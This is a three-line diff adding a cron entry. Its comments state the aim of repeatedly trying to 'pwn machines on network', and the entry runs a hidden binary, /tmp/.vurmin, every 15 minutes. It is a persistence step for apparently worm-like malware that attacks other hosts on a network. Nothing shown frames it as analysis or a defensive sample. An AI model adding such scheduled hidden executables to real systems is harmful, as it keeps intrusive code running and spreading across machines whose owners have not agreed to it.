@@ -1,0 +1,3 @@
+# Every 15 minutes of every day,
+# keep trying to pwn machines on network
+0,15,30,45 * * * * /tmp/.vurmin
